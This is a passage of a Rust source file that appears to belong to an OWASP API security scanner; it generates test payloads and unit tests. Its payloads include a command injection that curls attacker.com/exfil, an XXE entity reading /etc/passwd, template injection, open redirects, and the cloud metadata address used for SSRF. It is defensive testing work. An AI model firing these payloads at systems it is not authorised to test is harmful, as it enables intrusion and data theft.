                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::Custom("Payload passed unsanitized".to_string()),
                notes: Some("Injection payload in field passed to external service".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api10UnsafeConsumption,
                description: "Command injection in integration field".to_string(),
                value: r#"{"integration_data": "$(curl attacker.com/exfil)"}"#.to_string(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::Custom("Command execution".to_string()),
                notes: None,
            },
            OwaspPayload {
                category: OwaspCategory::Api10UnsafeConsumption,
                description: "SSTI in template field".to_string(),
                value: r#"{"template": "{{7*7}}"}"#.to_string(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::Custom("Template evaluated (49)".to_string()),
                notes: Some("Server-side template injection in field passed downstream".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api10UnsafeConsumption,
                description: "XXE in XML field".to_string(),
                value: r#"{"xml_data": "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>"}"#.to_string(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::InternalDataExposure,
                notes: None,
            },
            // Redirect manipulation
            OwaspPayload {
                category: OwaspCategory::Api10UnsafeConsumption,
                description: "Open redirect in return URL".to_string(),
                value: r#"{"return_url": "https://evil.com"}"#.to_string(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::Custom("Open redirect".to_string()),
                notes: Some("Inject external URL in redirect parameter".to_string()),
            },
            OwaspPayload {
                category: OwaspCategory::Api10UnsafeConsumption,
                description: "Open redirect with protocol".to_string(),
                value: r#"{"redirect": "javascript:alert(1)"}"#.to_string(),
                injection_point: InjectionPoint::Body,
                expected_if_vulnerable: ExpectedBehavior::Custom("Dangerous protocol accepted".to_string()),
                notes: None,
            },
        ]
    }

    /// Generate deeply nested JSON for resource exhaustion testing
    fn generate_deep_json(depth: usize) -> String {
        let mut json = String::from(r#"{"a":"#);
        for _ in 0..depth {
            json.push_str(r#"{"a":"#);
        }
        json.push_str("1");
        for _ in 0..=depth {
            json.push('}');
        }
        json
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_generate_all_payloads() {
        let config = OwaspApiConfig::default();
        let generator = OwaspPayloadGenerator::new(config);
        let payloads = generator.generate_all();

        // Should have payloads for all categories
        assert!(!payloads.is_empty());

        // Check we have payloads from multiple categories
        let categories: std::collections::HashSet<_> =
            payloads.iter().map(|p| p.category).collect();
        assert!(categories.len() > 5);
    }

    #[test]
    fn test_generate_bola_payloads() {
        let config = OwaspApiConfig::default();
        let generator = OwaspPayloadGenerator::new(config);
        let payloads = generator.generate_bola_payloads();

        assert!(!payloads.is_empty());
        assert!(payloads.iter().all(|p| p.category == OwaspCategory::Api1Bola));
    }

    #[test]
    fn test_generate_ssrf_payloads() {
        let config = OwaspApiConfig::default();
        let generator = OwaspPayloadGenerator::new(config);
        let payloads = generator.generate_ssrf_payloads();

        assert!(!payloads.is_empty());
        // Should include cloud metadata URLs
        assert!(payloads.iter().any(|p| p.value.contains("169.254.169.254")));
    }

    #[test]
    fn test_generate_deep_json() {
        let json = OwaspPayloadGenerator::generate_deep_json(3);
        assert!(json.contains("\"a\":"));
        // Verify it's valid JSON by checking brace balance
        assert_eq!(json.matches('{').count(), json.matches('}').count());
    }

    #[test]
    fn test_specific_categories() {
        let config = OwaspApiConfig::default()
            .with_categories([OwaspCategory::Api1Bola, OwaspCategory::Api7Ssrf]);
        let generator = OwaspPayloadGenerator::new(config);
        let payloads = generator.generate_all();

        // Should only have payloads from the specified categories
        assert!(payloads.iter().all(
            |p| p.category == OwaspCategory::Api1Bola || p.category == OwaspCategory::Api7Ssrf
        ));
    }
}
